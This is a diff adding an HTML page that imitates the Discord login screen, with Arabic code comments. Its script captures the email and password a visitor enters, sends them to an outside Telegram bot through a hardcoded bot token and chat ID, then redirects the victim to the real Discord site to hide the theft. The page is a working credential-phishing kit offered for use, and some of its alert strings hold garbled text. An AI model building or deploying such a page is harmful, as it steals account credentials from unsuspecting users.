@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('img/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+
+        .login-container {
+            background: #313338;
+            padding: 40px;
+            border-radius: 0px;
+            display: flex;
+            align-items: center;
+            width: 700px;
+            justify-content: space-between;
+        }
+
+        .login-form {
+            width: 60%;
+            text-align: center;
+        }
+
+        h2 {
+            margin: 0;
+        }
+
+        .gray-text {
+            color: #b0b0b0;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        label {
+            font-size: 12px;
+            margin-top: 10px;
+            color: #d1d1d1;
+        }
+
+        label span {
+            color: #ff0000;
+        }
+
+        input {
+            background: #23272a;
+            border: none;
+            padding: 12px;
+            margin-top: 8px;
+            color: white;
+            border-radius: 5px;
+            width: 100%;
+        }
+
+        .link-color {
+            font-size: 12px;
+            color: #0993d7;
+            text-decoration: none;
+        }
+
+        .login-btn {
+            background: #5865f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            margin-top: 15px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+            width: 100%;
+        }
+
+        .register {
+            font-size: 12px;
+            margin-top: 15px;
+        }
+
+        .qr-section {
+            text-align: center;
+            width: 35%;
+        }
+
+        .qr-section img {
+            width: 160px;
+            background: white;
+            padding: 5px;
+            border-radius: 5px;
+        }
+
+        .qr-text {
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .app-name {
+            font-weight: bold;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-container img {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        .logo-container span {
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="img/53b1cdc5b678256a229ab7791318354b.png" alt="Discord Logo">
+        <span>Discord</span>
+    </div>
+
+    <div class="login-container">
+        <div class="login-form">
+            <h2>Welcome back!</h2>
+            <p class="gray-text">We're so excited to see you again!</p>
+
+            <form id="loginForm">
+                <label for="email">EMAIL OR PHONE NUMBER <span>*</span></label>
+                <input type="text" id="email" required>
+
+                <label for="password">PASSWORD <span>*</span></label>
+                <input type="password" id="password" required>
+
+                <a href="#" class="link-color">Forgot your password?</a>
+
+                <button type="submit" class="login-btn">Log In</button>
+
+                <p class="register gray-text">Need an account? <a href="#" class="link-color">Register</a></p>
+            </form>
+        </div>
+
+        <div class="qr-section">
+            <img src="img/artworks-BgxOg9TMiBF2puuK-TzdOBg-t500x500.jpg" alt="QR Code">
+            <p class="qr-text">Log in with QR Code</p>
+            <p class="gray-text">Scan this with the <span class="app-name">Discord mobile</span> app to log in instantly.</p>
+            <a href="#" class="link-color">Or sign in with paswskey</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // الحصول على بيانات البريد الإلكتروني وكلمة المرور
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // عنوان بوت التليجرام الخاص بك
+            var botToken = "8105815943:AAGrL2b-QSSBfQrAoPzvznpH-VMGqPqDJ9M";
+            var chatId = "6961148285"; // يمكنك الحصول على chat ID من خلال بوت Telegram
+
+            // إعداد الرسالة لإرسالها إلى التليجرام
+            var message = "Email: " + email + "\nPassword: " + password;
+
+            // إرسال البيانات إلى بوت تليجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // إعادة التوجيه إلى الموقع بعد إرسال البيانات بنجاح
+                    window.location.href = "https://discord.com";
+                } else {
+                    alert("حدث خطأ أثنawdawdاء إرسال البيانات.");
+                }
+            })
+            .catch(error => {
+                alert("حدث خطأ أثناء adwإرساsaل البيانhات.");
+            });
+        });
+    </script>
+</body>
+</html>
